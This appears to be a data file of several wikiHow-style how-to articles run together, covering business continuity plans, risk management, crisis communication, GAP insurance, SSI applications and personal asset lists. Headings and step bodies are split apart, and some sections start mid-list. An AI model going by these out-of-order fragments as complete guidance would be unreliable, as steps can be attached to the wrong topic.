Identify who can telecommute.",How to Create a Business Continuity Plan2," Following the occurrence of an event that disrupts normal business operations, you will need to quickly mobilize key personnel in order to successfully execute a BCP. Create a list of internal key personnel and backups --- these are the employees people who fill positions without which your business absolutely cannot function. Make the list as large as necessary, but as small as possible.Make a list of all key internal personnel with all contact information including business phone, home phone, cell phone, pager, business email, personal email, and any other possible way of contacting them in an emergency situation where normal communications might be unavailable.
Consider which job functions are critically necessary to continue every day operations. You should think about who fills those positions when the primary job-holder is on vacation.
Remember that key personnel does not just include high-ranking executives. For example, a low to mid-level accounts receivable clerk might be responsible for processing reports that affecting AR loans or collections, which greatly affect the amount of available operating income. The accounts receivable clerk should be considered key personnel, because that person's job functions facilitates the company's access to capital provided by the processing of receivables and the collection of funds.

, On-site business computers often contain the most critical information that you and your employees must be able to access even when working off-site. You should make a list of critical equipment/data, and create a strategy for secure access in the event of a disruption.Don’t forget software that would often be considered critical equipment, especially if it is specialized software or if it cannot be replaced.


This list should include include passwords, identification data and the location of key files.
Some businesses cannot function even for a few hours without a fax machine. Do you rely heavily on your copy machine? Do you have special printers you absolutely must have?

, You should compile all documentation necessary to start your business over again in the event of a fire or other disaster that destroys critical documents located on-site. Make sure that you have alternative copies in physical storage offsite and ways to access critical documents such as articles of incorporation and other legal papers, utility bills, banking information, critical HR documents, building lease papers, tax returns and other critical documents.


You should consider what the plan of action would be if there was a total facility loss. Would you know when to pay the loan on your company vehicles? To whom do you send payment for your email services?

, In the event that business operations cannot continue at the regular location, telecommuting from home is a great way for employees to continue doing work as usual. Your employees’ ability to work, even when away from the office, will mean that at least some of the delays in performing work as usual can be avoided. Some people in your company might be perfectly capable of conducting business from a home office. Find out who can and who cannot work from home because of internet connectivity limitations or other issues, and make sure to provide your employees with the necessary resources for telecommuting.

Choose someone who is detail-oriented and analytical, as their job will entail reading and analyzing reports as well as creating comprehensive solutions to potential problems to help safeguard the company's assets and resources.;
, Physical risks include not only the security of your physical property against theft, but also any weaknesses or potential problems in the structure itself.You want to assess the structure of the building in which your business is located for potential defects, such as faulty wiring or substantial cracks in walls or ceilings, that could present a risk to your business.
If you lease rather than own the premises, these may not be things you can have repaired right away, but your risk management coordinator should identify and keep track of them.
Some problems, such as a broken lock on a back entrance, are glaring security problems that should be fixed immediately.
Physical risks also can relate to employee work habits or procedures. For example, if warehouse workers routinely put a cinder block in the back door when they go out for a smoke break rather than closing the door completely, this could present a security risk.

, Depending on your business's industry, the legal or regulatory environment could present challenges to your operations and budget for which you will need to account.For example, the FDA announced in 2016 that it would regulate e-cigarettes the same way it does regular cigarettes. If you own a business that manufactures or distributes vaping products, this announcement represents a significant change in the regulatory environment for your products.
Employment regulations also should be considered when assessing legal vulnerabilities. If your risk management coordinator doesn't have significant legal experience, consider working with a business attorney to assess the areas in which your company might be vulnerable.
Health and safety regulations are an issue for many small businesses, including restaurants and retail stores. Watching employees can help you identify areas in which you risk being cited for violations of these regulations.

, Regardless of the size of your workforce, you need to identify risks created by problems with employees and the intersection of state and federal employment law with your business's policies and procedures.Arrange for regular audits of your personnel and payroll files and make sure they are up to date and accurate.
Review your company policies and handbooks to identify areas in which you're at risk of a lawsuit for failing to meet the requirements of state or federal employment laws.
If you have state or federal contracts, you may have to comply with additional reporting requirements designed to encourage diversity in your workforce.

, Regular audits can detect vulnerabilities in your budget that may expose you to more risks, as well as discovering discrepancies that may indicate potential losses or accounting inaccuracies.Pay close attention to areas or departments that tend to have excessive expenses or exhibit larger loss margins than others.
If you have employees who travel for business and turn in mileage and expense reports for reimbursement, these should be carefully evaluated to ensure minimal loss.

, There are many independent agencies that offer services designed to review and report on potential risks to which your business might be exposed, as well as advise you on options to prevent those risks or minimize your exposure.Thoroughly vet any independent agency before you hire them. Keep in mind that many of these agencies are part of larger insurance companies and the ulterior purpose of their evaluations is to sell you additional insurance.
If you have a relatively small business, you may find the benefits of hiring an independent agency to conduct risk assessments and evaluations do not justify the expense.
However, state and federal government contracts typically include specific loss prevention requirements. If your business routinely works under such contracts, an independent agency can help ensure that your evaluations fulfill the government requirements.

, You must understand how likely a threat is to happen so that you can prioritize your resources to counter those threats or minimize your business's exposure.Compare the relative probability to the cost of eliminating or mitigating that risk. Even if a particular risk has a very low chance of actually occurring, if it could be eliminating by replacing a cheap part, it's in your company's best interest to go ahead and do that.
High-probability threats that also would be expensive to counter or control may require planning in multiple stages to gradually reduce the threat over time.

, If your business has already faced any of the risks you identified, your past response can reveal additional safeguards that could be put in place or errors to be corrected.For example, if your business was the victim of a hack in which credit card numbers were stolen, your evaluation should include a summary of when and how you responded to the hack, what measures were taken to prevent it from happening again, and whether there are any lingering issues with customers that remain unresolved.
Consider employee responses in situations such as accidents or injuries on the premises.
If your business has been hit by a natural disaster, evaluate how the situation was handled immediately following the event, the response of your insurance company, and how well your business recovered.

, Based on your evaluation, you should come up with a report for each significant risk that analyzes the likelihood that the risk will occur, the steps you've already taken to prevent it, and additional steps you can take to further decrease the likelihood of its occurrence.The reports should not only analyze the business's vulnerability to particular risks, but also list possible actions that could reduce or eliminate the risk, along with the time it would take to implement those actions and what they would cost.
For more large-scale problems, give your risk management coordinator the power to delegate specific tasks to other members of your staff or to hire experts to further evaluate the situation.

, You can effectively combat some risks, particularly those related to employees, by changing company policies so that the risk of a potential problem is reduced or eliminated.For example, changing or clarifying termination proceedings can reduce the risk of a wrongful discharge lawsuit.
Past experience also can be a guide. If someone exploited a loophole in a particular policy and it ended up costing the company significant time, money, or resources, you should modify your policy to close the loophole so the same thing cannot happen again.
Designate specific employees to be in charge of handling employee complaints so your employees always know who they need to talk to. Establish procedures that require all actions taken to resolve a workplace dispute to be recorded in writing.
If a significant policy overhaul is required, consider consulting with a business or employment attorney regarding the efficacy of your proposed policy changes.

, All employees must be trained to fully understand the application of laws and regulations to their workplace, as well show to identify and respond to potential problems on a daily bases.Gender discrimination and sexual harassment training in particular can reduce the company's risk of being sued for sexual harassment in the workplace or a hostile work environment.
Employees also should receive regular training on health and safety regulations that apply in your workplace.
Make sure all managers and supervisors receive additional training on how to resolve disputes and effectively communicate with employees.

, A comprehensive liability insurance policy can protect your business from many potential risks, including the threat of a lawsuit if a customer is injured on your property.Property insurance will protect you against the loss or damage of company property, while a liability policy protects you if there is an accident or injury on company grounds.
Workers' compensation insurance, required in all states, covers you in the event an employee is injured on the job.
If you have a professional business such as a law firm or a medical practice, you may be required by your state's law to carry malpractice insurance on all professional employees. Even if it isn't legally required, malpractice insurance is sound risk management.
If your business is particularly susceptible to risks, you may want to consider purchasing additional umbrella insurance coverage.

, Particularly if you make frequent use of computers and networks in your business operations, frequent security scans are a must to ensure that your business data is protected from theft or corruption.You can contract an independent company to monitor your network and notify you of security risks.
Make sure your wireless network is password-protected and all sensitive information is encrypted.
Train your employees on the security of information, and make sure any passwords or access keys are not left out where anyone can see them, such as on a note taped to a computer monitor.

, In the event of an emergency, all employees should know how to secure and evacuate the facility to ensure minimal injuries or damage to the business's property and assets.Keep in mind that if disaster strikes, you may be responsible not only for the lives of your employees but also any customers or clients on the premises.
Train employees on evacuation procedures and post signs with evacuation routes in a prominent location, particularly if your business is located in an area that frequently is at risk of natural disasters.

Anticipate how this change might impact your current work.,
Research the policy, if needed.,
Talk to your boss or to management.,
Talk to your coworkers about how they are adapting.",How to Adapt to Changes in a Business Environment2," In order to adapt to a change in a business environment, you need to be able to anticipate how the change will impact you, your work, and the workplace environment. The impact could range from very small to very large. The impact will depend on the scope of the change, what sorts of adjustments you will have to make, and how quickly the change will be implemented. Anticipating how this change will impact you will help you to manage your expectations and to adapt effectively.


There may not be much that you will need to change. Some changes in the workplace will impact you more than others. Other changes will require you to make incremental adjustments over time in order to fully adapt. For example, a change in payroll policies may not affect you if you work in sales.

, In the business world, some changes require companies and teams to undergo major overhauls. These policies may change how the company handles clients, impacts sales, or changes the leadership of the organization.You may or may not need to research the policy to fully understand it. It can be very useful to research the change that your organization is going to make to see whether other businesses have made similar changes. For example, the change might be in management styles and the structure of your executive team. You could search online for other companies who have made that same change to see how they responded to it.


While situations are always different, seeing how similar changes have impacted businesses is a helpful way to understand how your business may respond. It can also help you to understand the scope of the change.

, Ideally, your management will have open lines of communication and be receptive to hearing questions and concerns about the new change that is being made. You should talk with your manager or supervisor if you have questions about the change, especially about what sort of changes that you will individually have to make and its impact.


For instance, you could say, “John, I’ve been looking into the new policy about filling insurance claims. I want to make sure that I fully understand it before it goes into effect. Could you tell me a little more about how the claims are evaluated?”

, If you work in a business environment where other members of your team have to adapt to the same change, you can talk to them about the steps that they are taking. They may have suggestions to offer you about how you can adapt to the change. You can ask them how they have adapted and whether they are struggling with it and could use support.


Avoid gossiping or talking negatively about the change and the people who suggested or implemented it. You want your mindset to remain positive, otherwise you may struggle to adapt to the change.

"
"
Take a vacation.,
Build healthy relationships with your coworkers.,
Establish boundaries.,
Ask for support when you need it.",How to Adapt to Changes in a Business Environment3," Coping with changes in the workplace can be stressful. It can be helpful to take a day off, or a few days, to spend time at home and relax. Find out whether you have any paid time off days and take advantage of them. Big changes in the workplace can cause a lot of stress, and taking some time off can help you recover from the stress and feel like yourself again.


If you can't take an actual vacation, you should take short breaks during your workday to reduce the possibility that you'll become burned out.Take a five minute break from your desk to make yourself a cup of coffee, to walk around the office, or to go outside for a breath of fresh air.

, Friendships both in and outside of work are very helpful in reducing stress. Since you spend a considerable amount of time each day with your coworkers, it is helpful to build strong and healthy relationships with the people there. These relationships should have boundaries though; you shouldn't talk about things that are inappropriate in the workplace and your friendships should never distract from your actual work., Your work is a very important part of your life, but it shouldn't be your entire life. It is unreasonable to expect that you can be on call for 24 hours every day.Setting boundaries between your work and home life, like not checking your email after 6pm or not taking work phone calls on the weekend, can help you compartmentalize your work and keep the two separate.


These boundaries can help to limit the amount of stress that this change can have on your life. Your adaption to changes in the workplace shouldn't affect your home life.

, Adapting to change can be difficult and it can wear on you, especially when the change is large and impacts a lot of different parts of your work. This can feel overwhelming at times, and you may feel like you aren't equipped to handle it. Even though it can be difficult to admit that you need help, support from other people can be very helpful.Talk to your supervisor if you are struggling with making the transition, and see if they have any recommendations about adapting that could help you. You can also talk to someone who is close to you in your personal life to see if they have an outside perspective on your situation.

Prepare for a crisis ahead of time.,
Draft your messages.,
Deliver your messages as soon as you possibly can.",How to Communicate in a Business Crisis," It is important to establish a method for handling a crisis before a crisis happens. The following steps will lead to an effective crisis management plan.


Identify what could go wrong. This list will be different for each company, and should be as thorough as possible. For example, a cake delivery business may experience a crisis caused by food allergens, an accident during transportation and/or a fire in the kitchen. Maintain a fact sheet outlining each and every crisis possibility, as well as the people who must be involved, the methods that must be used to divert the crisis and the audience you must deliver crisis information to.
Familiarize yourself with your audience. Depending on how large your company is, your audience may be composed of 1 or a combination of the following: employees, customers, board members, politicians, the press and/or the media.
Create a crisis communication plan. This plan should direct the flow of information in the event of a crisis. Taking into account each of the segments of your audience, decide on the outlets you will use to communicate with your audience when a crisis does happen. For example, if your audience is composed of your employees, customers and the press, then your crisis communication plan should incorporate methods for communicating with all 3 of them; this could mean holding telephone conferences for employees, sending mass emails to customers and writing a press release for newspapers.
Assign responsibilities to members of a crisis communication team. For each item on your communication plan, you will need to assign a task to a communication team member. For example, you may delegate the task of drafting the crisis message to the marketing director, the task of conducting telephone conferences to the human resources manager, the task of sending mass emails to your Internet sales division manager and the task of working with newspaper editors to the vice president. Additionally, you may want to choose a company spokesperson for high-profile crisis situations.;
, When a crisis occurs, it is time to enact your crisis communication plan. Gather all of the information you can about the crisis in order to prepare your crisis messages - 1 tailored to each segment of your audience. A crisis message should include the following elements:


An explanation of the crisis. Be as succinct as possible. Try to give the audience enough information to satisfy their inquiries but not so much information to seem as though you are trying to explain your way out of something.
A revelation of your concern. Let your audience know that you are genuinely affected by the impact the crisis may have on everyone involved.
A claim to responsibility, as applicable. Own up to your part in the crisis, and offer a sincere apology, if it is warranted.
A pledge to address the cause of the business crisis, and to work to find a solution. Offer a firm commitment to preventing a future repeat of the crisis.
An assurance that the crisis is an isolated event - not to be confused with the company's overall efficiency - and that you are still confident in your company. However, you should only provide this assurance if you can stand behind it without reservation. Do not lie, exaggerate or twist the facts in a way that only provides false hope to your audience.

, Your goal is to get information to your audience members before they get it from less reliable or damaging sources. Use the avenues outlined in your crisis management plan to communicate your messages to each segment of your audience.

Identify contingency equipment options.,
Identify your contingency location.,
Make a ""How-to"" section in your BCP.,
Document external contacts.,
Put the information together!",How to Create a Business Continuity Plan3," Contingency equipment options are accessible equipment alternatives that can be used if and when normal business operations are disrupted.Where would you rent trucks if a disaster damaged or destroyed vehicles used in the ordinary course of business? Where would you rent computers? Can you use a business service outlet for copies, fax, printing, and other critical functions?
Alternative equipment suppliers typically do not have to be identified specifically, unless they are unique and an arrangement has already been negotiated (very rare).
It is more important to identify the services, equipments and/or resources a substitute must be able to supply. The key personnel entrusted with the responsibility of managing the relationship with the substitute must have the necessary authority to make relevant decisions.

, This is the place you will conduct business while your primary offices are unavailable.It could be a hotel – many of them have very well-equipped business facilities you can use. It might be one of your contractors’ offices, or your attorney’s office.
A storage rental facility near your regular site might be a great place to relocate and store products in a pinch.
Perhaps telecommuting for everyone is a viable option.
If you do have an identified temporary location, include a map to the location in your BCP. Wherever it is, make sure you have all the appropriate contact information (including people’s names).

, It should include step-by-step instructions on how to execute the BCP and address what to do, who should do it, and how. List each responsibility and write down the name of the person assigned to it. Also, do the reverse: For each person, list the responsibilities. That way, if you want to know who is supposed to call the insurance company, you can look up ""Insurance"", and if you want to know what Joe Doe is doing, you can look under ""Joe"" for that information.

, If you have critical vendors or contractors, build a special contact list that includes a description of the company (or individual) and any other absolutely critical information about them including key personnel contact information.Include in your list people like attorneys, bankers, IT consultants...anyone that you might need to call to assist with various operational issues.
Don’t forget utility companies, municipal and community offices (police, fire, water, hospitals) and the post office!

, A BCP is useless if all the information is scattered about in different places. A BCP is a reference document and it should all be kept together in something like a 3-ring binder.


Make plenty of copies and give one to each of your key personnel.
Keep several extra copies at an off-site location, at home and/or in a safety-deposit box.

"
"
Communicate the BCP to relevant employees.,
Provide essential BCP plan information to non-key personnel.,
Plan on modifying and updating your BCP.",How to Create a Business Continuity Plan4," Make sure all employees who could be potentially affected by a disruption have read and understand the BCP. Take the time to ensure that employees are aware of their relevant roles in the implementation and execution of the policy.

, Don't leave things to chance! Even if key personnel are informed about their role under the BCP, you should still make sure that all employees are aware of building evacuation procedures, as well as contingency locations. This way the unforeseeable absence of key personnel will not prevent non-key personnel from knowing how to respond to business operation disruptions.

, No matter how good your BCP, it is likely that there will be disruptive events that are not provided for in your plan. Be open to updating and/or modifying your BCP in light of additional information and/or changed circumstances. Every time something changes, update all copies of your BCP, and never let it get out of date.

Understand how GAP insurance works.,
Understand what costs are not covered by GAP insurance.It is important to keep in mind that GAP insurance only covers the difference between the car’s value and what you owe on it, if any.,
Look up your car’s current and projected fair market values.,

Recognize if you are comfortable not purchasing GAP insurance.,
Purchase a comprehensive and collision coverage policy on your car.,
Purchase GAP insurance at a dealership.,
Purchase GAP insurance from an auto insurance agent.Your regular auto insurer may be able to offer GAP insurance at a better rate than a car dealership.,
Drop GAP insurance, if you purchased it, once you obtain equity on your car.Once you reach the point at which you stop making payments and/or the fair market value of your car is more than what you owe on it, GAP insurance becomes unnecessary and you can remove it from your auto insurance policy.",How to Buy Gap Insurance," If your car is declared a total loss (totaled) because of an accident or damage, your auto insurance will reimburse you up to its fair market value. This usually happens to older cars when repair costs are greater than the car's actual cash value. Sometimes, however you owe more on the car than it is worth.GAP insurance helps make up for that. For example:


You purchase a car for $20000, and pay $2000 as a down payment. This leaves you with $18000 of the car’s value to finance with a loan.
You make monthly payments of $400.
After having the car for five months, you are in an accident and the car is totaled.
At this point, you have paid $2000 of the car loan (five monthly payments of $400 = $2000).
This still leaves you with $16000 ($18000-$2000 = $16000) of your car loan to pay.
The fair market value of a five-month old model of your car is determined to be $14000.
Your auto insurance reimburses you for the fair market value of the car, $14000.
You are still left with $2000 of the car’s loan to pay ($16000-$14000 = $2000). This difference between the fair market value of the car and what you owe on it is not covered by your regular auto insurance.
You must pay the difference out of pocket, or GAP insurance will pay for it, if you have it.;
, It does not cover the costs of:


Continuing payments if you become unemployed or disabled
Repairing your car if it is damaged
Renting a car if you need one while getting repairs
The difference between your car’s value before it is damaged, and its value after being repaired
Late fees
Interest on your loan

, If you want to know if you need GAP insurance, look at the car’s fair market value and what you owe on it. You can find this information in the Kelly Blue Book or NADA Black Book.Cars often lose substantial value as soon as they are sold.Some estimates suggest that on average, a car loses 11% of its value as soon as it is driven off of the lot, and 15% to 25% of its residual value each subsequent year.
If you are considering GAP insurance before buying a car, you can look at the fair market value of the car with models that are a year old, two years old, etc. Then compare this to the amount that will still be owed on your car loan after you make payments for a year, two years, etc.

, Purchasing GAP insurance may or may not make sense for you, depending upon your situation. It may be a good idea if you:Made a down payment on your car that was less than 20% of its value
Have financed a car for longer than 60 months
Are leasing a car
Purchased a car that is expected to lose value (depreciate) faster than the average vehicle
Purchased the car by rolling over a debt owed on a previous vehicle into the cost you owe for the new car
Need the peace of mind from knowing that the gap between the car’s value and what you owe on it will be taken care of

, If the gap between your car’s value and what you owe on it is typically expected to be small, you may prefer to pay for it out of pocket in the event of an accident, rather than purchasing GAP insurance.If you purchase your car outright (with no financing or payments to make), then you will not need GAP insurance.


Many insurance companies now offer full replacement costs or better in their policies for an extra fee.
If you already own your car, in the event of an accident, you will receive the fair market value of your car from your auto insurer, and not have a gap to make up for.

, In most cases, GAP insurance can only be used if you have purchased a comprehensive and collision coverage policy (also known as “full coverage”) for your car from your auto insurance agent.This insures that you receive the maximum reimbursement from your auto insurer before GAP insurance is used to make up the difference between your car’s value and what you owe on it.

, GAP insurance is often offered by dealerships when you are going through the process of purchasing a car.When purchased from a car dealership, GAP insurance is usually charged as a single payment for the entire term.Dealers may charge approximately $500-$700 for GAP insurance, and charge interest if that amount is factored into your loan.If you are leasing a car, the lease agreement may include a GAP waiver (sometimes for a stated fee).In some cases, dealers may require you to purchase GAP insurance when purchasing the car. This is rare, so your dealer should explain clearly why it is a requirement, and show you where this requirement is stated in the lease or purchase agreement.Be wary of dealers that try to push you into purchasing GAP insurance when it is optional. Dealers should be happy to explain your options when purchasing a car, but should not try to force you into buying coverage that you don’t need.
You can ask your dealer to tell you what the value of the car will be once you drive if off the lot — this will give you an idea of whether or not GAP insurance makes sense for you.

, Insurers usually charge 5%-6% of your collision and comprehensive coverage premium for GAP insurance.For instance, if you pay $1000 a year for collision and comprehensive coverage, you may be able to add GAP insurance to your auto policy for $50-$60 per year.


In general, you can shop around at different insurers to get the best rates.

,


Periodically check your car’s value using the Kelly Blue book or NADA Black Book, and compare it to the amount you still owe on the car. This will give you an idea of the gap between the two amounts, if any.

Monitor your risks.",How to Develop a Risk Management Plan," Risk is the effect (positive or negative) of an event or series of events that take place in one or several locations. It is computed from the probability of the event becoming an issue and the impact it would have (See Risk = Probability X Impact). Various factors should be identified in order to analyze risk, including:


Event: What could happen?






Probability: How likely is it to happen?






Impact: How bad will it be if it happens?
Mitigation: How can you reduce the Probability (and by how much)?
Contingency: How can you reduce the Impact (and by how much)?
Reduction = Mitigation X Contingency
Exposure = Risk – Reduction
After you identify the above, the result will be what’s called Exposure. This is the amount of risk you simply can’t avoid. Exposure may also be referred to as Threat, Liability or Severity, but they pretty much mean the same thing. It will be used to help determine if the planned activity should take place.
This is often a simple cost vs. benefits formula. You might use these elements to determine if the risk of implementing the change is higher or lower than the risk of not implementing the change.


Assumed Risk. If you decide to proceed (sometimes there is no choice, e.g. federally mandated changes) then your Exposure becomes what is known as Assumed Risk. In some environments, Assumed Risk is reduced to a dollar value which is then used to calculate the profitability of the end product.;
, In this article, let's pretend you are responsible for a computer system that provides important (but not life-critical) information to some large population. The main computer on which this system resides is old and needs to be replaced. Your task is to develop a Risk Management Plan for the migration. This will be a simplified model where Risk and Impact are listed as High, Medium or Low (that is very common especially in Project Management).

, Brainstorm on risks. Get several people together that are familiar with the project and ask for input on what could happen, how to help prevent it, and what to do if it does happen. Take a lot of notes! You will use the output of this very important session several times during the following steps. Try to keep an open mind about ideas. ""Out of the box"" thinking is good, but do keep control of the session. It needs to stay focused and on target.

, From your brainstorming session, you gathered information about what would happen if risks materialized. Associate each risk with the consequences arrived at during that session. Be as specific as possible with each one. ""Project Delay"" is not as desirable as ""Project will be delayed by 13 days."" If there is a dollar value, list it; just saying ""Over Budget"" is too general.

, If you’re moving, for example, a car dealership’s computer system, then threats such as nuclear war, plague pandemic or killer asteroids are pretty much things that will disrupt the project. There’s nothing you can do to plan for them or to lessen the impact. You might keep them in mind, but don’t put that kind of thing on your risk plan.

, You don’t need to put them in any order just yet. Just list them one-by-one.

, For each risk element on your list, determine if the likelihood of it actually materializing is High, Medium or Low. If you absolutely have to use numbers, then figure Probability on a scale from 0.00 to 1.00. 0.01 to 0.33 = Low, 0.34 to 0.66 = Medium, 0.67 to 1.00 = High.


Note: If the probability of an event occurring is zero, then it will be removed from consideration. There’s no reason to consider things that simply cannot happen (enraged T-Rex eats the computer).


, In general, assign Impact as High, Medium or Low based on some pre-established guidelines. If you absolutely have to use numbers, then figure Impact on a scale from 0.00 to 1.00 as follows: 0.01 to 0.33 = Low, 0.34 – 066 = Medium, 0.67 – 1.00 = High.


Note: If the impact of an event is zero, it should not be listed. There’s no reason to consider things that are irrelevant, regardless of the probability (my dog ate dinner).


, Often, a table is used for this. If you have used the Low, Medium and High values for Probability and Impact, the top table is most useful. If you have used numeric values, you will need to consider a bit more complex rating system similar to the second table here. It is important to note that there is no universal formula for combining Probability and Impact; that will vary between people and projects. This is only an example (albeit a real-life one):


Be flexible in analysis. Sometimes it may be appropriate to switch back and forth between the L-M-H designations and numeric designations. You might use a table similar to the one below.


, List all the elements you have identified from the highest risk to the lowest risk.

, In Table 6, you have 7 risks assigned as H, H, M, M, M, L, and L. This can translate to 0.8, 0.8, 0.5, 0.5, 0.5, 0.2 and 0.2, from Table 5. The average of the total risk is then 0.5 and this translates to Medium.

, Mitigation is designed to reduce the probability that a risk will materialize. Normally you will only do this for High and Medium elements. You might want to mitigate low risk items, but certainly address the other ones first. For example, if one of your risk elements is that there could be a delay in delivery of critical parts, you might mitigate the risk by ordering early in the project.

, Contingency is designed to reduce the impact if a risk does materialize. Again, you will usually only develop contingencies for High and Medium elements. For example, if the critical parts you need do not arrive on time, you might have to use old, existing parts while you’re waiting for the new ones.

, How much have you reduced the Probability and Impact? Evaluate your Contingency and Mitigation strategies and reassign Effective Ratings to your risks.

, Now your 7 risks are M, M, M, L, L, L and L, which translate to 0.5, 0.5, 0.5, 0.2, 0.2, 0.2 and 0.2. This gives an average risk of 0.329. Looking at Table 5, we see that the overall risk is now categorized as Low. Originally the Risk was Medium (0.5). After management strategies have been added, your Exposure is Low (0.329). That means you have achieved a 34.2% reduction in Risk through Mitigation and Contingency. Not bad!

, Now that you know what your risks are, you need to determine how you’ll know if they materialize so you’ll know when and if you should put your contingencies in place. This is done by identifying Risk Cues. Do this for each one of your High and Medium risk elements. Then, as your project progresses, you will be able to determine if a risk element has become an issue. If you don’t know these cues, it is very possible a risk could silently materialize and affect the project, even if you have good contingencies in place.

You must live in the U.S. or the Northern Mariana Islands.
If you're disabled, you must accept vocational rehabilitation services.
A wide range of disabilities may qualify a person depending on the specifics of his or her situation. You can find a comprehensive screening tool at: http://ssabest.benefits.gov/
;
, The amount you receive in social security depends on your “covered earnings,” which is the amount on which you’ve paid social security taxes over your life. This average is called your average indexed monthly earning (AIME).The SSA uses this number differently between retirees and disability applicants to determine your monthly amount.


In 2015, for instance, the average social security disability payment is $1,165 and the maximum benefit is $2,663.For retirees, the amount is more difficult to determine because it’s based on the exact age, amount paid into the social security system, and even year in which the person will retire since the system is expected to change before many Generation X and younger Americans retire. However, the SSA does have an estimator allowing you to plan your benefit amount, which you can find here.

, Have the following original or certified documents available:


Social Security card.
Birth certificate.
Information about your place of residence, such as your lease or mortgage papers.

, Current employment compensation and other income sources affect the SSI amount that you will receive. You will need to have all of your relevant employment records available, including:


A list of detailed job descriptions and employment dates for your last five jobs.
Information about your income, such as pay stubs, rental payments received, dividends from stocks and annuities, banking information, etc.
Information about any workers' compensation or insurance claims you filed.
Your W-2 Forms from the previous year. If you are self-employed, collect your IRS Form 1040 with Schedules C and SE.
The Social Security numbers for your spouse and any minor children you have.
Your bank account and routing number information (if you want your SSI benefit checks direct-deposited).
Your military service discharge documents for any periods of active duty, if applicable.

, Make sure your medical documentation is in order before calling or meeting with an SSA representative. You need documentation of all doctor's visits related to your disability if that is your grounds for seeking SSI benefits. You should include:


The names and contact information of doctors who treated your disability.Include the names of specific hospitals and doctors, your patient identification number(s), and the dates of each of your treatments.
The names of prescription medications you currently take.
The names and dates of all the medical tests you have had since you began experiencing your disability. You must also collect and have ready the name of each health care provider who advised you to take the tests.
The contact information of the insurance company, the name of the claim, and its assigned claim number.
Contact information for people who are familiar with your medical conditions, people like friends, family, and caregivers who may be able to supply information needed to complete your claim.

, You'll need to be able to easily refer to it during your SSI application and interview process. You may want to organize your paperwork in chronological order or put your paperwork in a binder with labeled dividers or into folders that separate W-2 forms from health provider contact information and so on.

, Most retirees can complete the application process online in less than an hour with all the documentation handy.The online application process allows you to skip much of the wait, and the SSA will contact you if they need more information or to schedule an interview. You can find the online application for retirement benefits here.

, If the SSA's website determines that you should apply in person instead, you will be directed to call your local office.Call 1-800-772-1213 to get in touch with a local SSA office.Provide SSA with your Social Security number over the telephone. Continue to follow the telephone prompts to locate the nearest SSA office.
When you start your application, you'll need to give basic information about your situation. More detailed questions will be asked during a later appointment.

, You will be asked to schedule an appointment with a representative to complete the application process. You may schedule a time to speak with the representative either over the phone or in person. During the appointment, you will answer detailed questions about your disability, your medical history and your financial situation.


The purpose of this appointment is for the SSA representative to assess what level of disability you exhibit and what level of benefits you should receive as a result of your disability.

, The SSA representative will ask you a series of questions related to the information you provide. This is considered a fact-finding process. After gathering the facts, the SSA will review your materials before making a decision. Be sure to answer as honestly and thoroughly as possible. You can anticipate being asked questions about:What duties you performed at your last few jobs.
What medical treatments you received for any disability.
How your disability has affected your quality of life.

, You will receive a letter after your interview once the SSA verifies your application information and determines if you meet the eligibility requirements for SSI benefits. Review the letter to see if you are approved for SSI benefits.


Review and record your payment amount and the date you will begin receiving payments if you were approved for SSI benefits.
If you were not approved for SSI benefits, you will receive an explanation why along with information on how to appeal the SSA's decision if you disagree.

, If you're unhappy with the SSA decision regarding your application, you can appeal within 60 days of the date that you received the Notice of Decision. You can appeal in writing, or you can appeal online if the SSA denied the application for medical reasons.For online appeals, visit: http://www.ssa.gov/disabilityssi/appeal.html.

, Appeals to the SSA for a denial of SSI benefits can potentially go through four levels, including:


Reconsideration by someone not involved in your first application.
A hearing by an administrative law judge.
A review by the Appeals Council.
A federal court review.

, If you lose your appeal, you can't reapply for SSI unless your condition changes and becomes more severe or if you are diagnosed with a new condition that renders you eligible.


If this situation applies to you, you may reapply for disability 60 days after your denial (either the date of the original denial if you do not appeal the decision, or the date that you lost the appeal, if you appealed).

Keep your information up to date.",How to Make a List of Personal Assets," There are two main ways you can document your list. You can do it by hand in a notebook. This has the benefit of being accessible at any time when the notebook is in hand and can be kept in a safe place. The other option is to use an electronic spreadsheet to keep records, which is convenient and can be easily changed. An electronic list can also be printed, downloaded into the Cloud, or stored on a thumb drive.


You can create tables in Microsoft Word or use Microsoft Excel to create your electronic list. You can make headings for each category and subcategory.You can also easily add things to your list in either program by adding rows and columns to the tables.
Either option is legitimate. It depends on your personal preference for record keeping. The electronic version is more easily shared, changed, and added to, so many people choose this option.;
, There are two main types of assets. The first is physical assets. These are the tangible properties you own such as your home, furnishings, automobiles, artwork, clothes, and other items that you can see and feel. The evidence of your ownership of physical assets is documented in legal documents including deeds and titles.Some items may be difficult to classify since they have elements of both categories.
For example, fine jewelry may be family heirlooms passed down from generation to generation. It is still worn on special occasions and listed in the physical category. At the same time, this same jewelry may be valuable enough that it requires insurance and special safe-keeping, which are elements typically required for financial assets.

, The second type of assets are financial assets. These are your intangible properties that represent ownership of bank accounts, securities, insurance policies, stocks and bonds, and other evidence of value for those assets that affect your income or wealth.Financial assets also include home, car, and personal loans, retirement and investment accounts, and credit cards.Don’t worry about making a strict distinction between the two categories. Just put the items in the categories that you feel best represent them. It is more important that all items are listed than where they appear on your list.

, On your inventory list, you should document a good amount of your personal information. This will help attach you to your assets through the documentation. You should include your name, passport number, income tax number, location of your will, and signature.


You can also include the names of the executors of your will, safety deposit box location and number, email accounts, and online passwords for bills, accounts, and profiles., Once you start your personal inventory, you need to include as much information as possible about each physical asset. This includes a detailed description of each item. You should create categories under physical assets in your list in order to keep your assets straight. You can have a category for automobiles, jewelry, entertainment equipment, and valuable collections. You should also include the fair market value of each item you list.For example, a description of a television should include the name and size of the equipment, necessary accessories for operation such as a remote, its general condition, and how much it costs.
You should value your collections, such as coins, stamps, or collectibles, as a unit instead of item by item.Include photographs with dates they were taken to avoid later misunderstandings or confusion about the items you own.
If appraisals of value have been completed in the past, note the appraiser’s name, contact information, and relevant details of the appraisal., In addition to the list, you need to give evidence of intangible assets such as deeds, titles, certificates, insurance policies, and financial accounts.These should be identified with account numbers and owner details such as name, address, and Social Security numbers. You should also include the names of any persons that have legal authority to manage, sell, or otherwise dispose of each financial asset.


You should also include the names of the owners, the insured, and beneficiaries of any insurance policies., For some items, especially the more costly items, you may need to include acquisition information. If you remember where you got certain items, you should list the elements of acquisition including the name, address, and phone number of the seller as well as the price.


You should describe how you came to possess the item, such as a purchase, a gift, an inheritance, or a foreclosure.
For extremely high cost items, keep purchase receipts and warranty information if possible.

